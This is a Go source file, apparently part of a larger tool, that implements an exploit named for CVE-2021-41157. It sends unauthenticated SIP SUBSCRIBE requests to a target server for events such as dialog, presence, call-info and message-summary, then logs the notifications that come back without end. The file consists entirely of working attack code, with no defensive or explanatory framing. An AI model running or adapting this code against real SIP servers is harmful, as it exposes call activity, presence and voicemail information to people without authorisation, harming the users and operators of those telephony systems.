package main

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"regexp"
	"strings"
	"time"
)

var (
	maxBufLen   = 11264
	dialTimeout = 2
	events      = []string{
		"talk", "hold", "conference", "as-feature-event",
		"dialog", "line-seize", "call-info", "sla",
		"include-session-description", "presence",
		"presence.winfo", "message-summary", "refer",
	}
	rportRex = regexp.MustCompile(`(?i)rport=(\d{1,5})`)
	recvdRex = regexp.MustCompile(`(?i)received=((?:\d{1,3}\.){3}\d{1,3})`)
)

func cve2021x41157(host string) {
	conn, err := net.DialTimeout("udp", strings.Split(host, "@")[1], time.Duration(dialTimeout)*time.Second)
	if err != nil {
		log.Println(err.Error())
		return
	}
	defer conn.Close()

	localIP := conn.LocalAddr().String()
	var payload string
	payload += fmt.Sprintf("SUBSCRIBE sip:%s;transport=UDP SIP/2.0\r\n", strings.Split(host, ":")[0])
	payload += fmt.Sprintf("Via: SIP/2.0/UDP 127.0.0.1:12701;rport;branch=z9hG4bK-%s\r\n", genRandStr(10))
	payload += "Accept: */*\r\n"
	payload += fmt.Sprintf("To: <sip:%s;transport=UDP>\r\n", host)
	payload += fmt.Sprintf("From: <sip:6969@%s;transport=UDP>;tag=%s\r\n", strings.Split(host, "@")[0], genRandStr(8))
	payload += fmt.Sprintf("Contact: <sip:%s@127.0.0.1:12701;transport=UDP>\r\n", strings.Split(host, "@")[0])
	payload += "Max-Forwards: 70\r\n"
	payload += "Expires: 600\r\n"
	payload += fmt.Sprintf("User-Agent: %s\r\n", userAgent)
	payload += fmt.Sprintf("Call-ID: %s\r\n", genRandStr(20))
	payload += "CSeq: 1 SUBSCRIBE\r\n"
	payload += "Event: dialog\r\n"
	payload += "Content-Length: 0\r\n"
	payload += "\r\n"

	//conn.SetDeadline(time.Now().Add(time.Duration(connTimeout) * time.Second))
	_, err = conn.Write([]byte(payload))
	if err != nil {
		log.Println(err.Error())
		return
	}
	buff := make([]byte, maxBufLen)
	_, err = conn.Read(buff)
	if err != nil {
		log.Println(err.Error())
		return
	}

	r := rportRex.FindAllSubmatch(buff, -1)
	s := recvdRex.FindAllSubmatch(buff, -1)
	recvd, rport := "", string(r[0][1])
	if len(s) > 0 {
		recvd = string(s[0][1])
	} else {
		recvd = localIP
	}

	log.Println("Registering for the events...")
	for _, event := range events {
		payload = ""
		payload += fmt.Sprintf("SUBSCRIBE sip:%s;transport=UDP SIP/2.0\r\n", strings.Split(host, ":")[0])
		payload += fmt.Sprintf("Via: SIP/2.0/UDP %s:%s;rport;branch=z9hG4bK-%s\r\n", recvd, rport, genRandStr(10))
		payload += "Accept: */*\r\n"
		payload += fmt.Sprintf("To: <sip:%s;transport=UDP>\r\n", host)
		payload += fmt.Sprintf("From: <sip:6969@%s;transport=UDP>;tag=%s\r\n", strings.Split(host, "@")[1], genRandStr(8))
		payload += fmt.Sprintf("Contact: <sip:%s@%s:%s;transport=UDP>\r\n", strings.Split(host, "@")[0], recvd, rport)
		payload += "Max-Forwards: 70\r\n"
		payload += "Expires: 600\r\n"
		payload += fmt.Sprintf("User-Agent: %s\r\n", userAgent)
		payload += fmt.Sprintf("Call-ID: %s\r\n", genRandStr(20))
		payload += "CSeq: 1 SUBSCRIBE\r\n"
		payload += fmt.Sprintf("Event: %s\r\n", event)
		payload += "Content-Length: 0\r\n"
		payload += "\r\n"
		println(payload)

		_, err := conn.Write([]byte(payload))
		if err != nil {
			log.Println(err.Error())
		}
	}
	// we keep reading for 100 seconds
	// conn.SetDeadline(time.Now().Add(100 * time.Second))
	for {
		buff := make([]byte, 20480)
		_, err := conn.Read(buff)
		if err != nil {
			log.Println(err.Error())
		}
		buff = bytes.Trim(buff, "\x00")
		if len(buff) > 0 {
			log.Println("Received:", strings.Split(string(buff), "\r\n\r\n")[1])
		}
	}
}
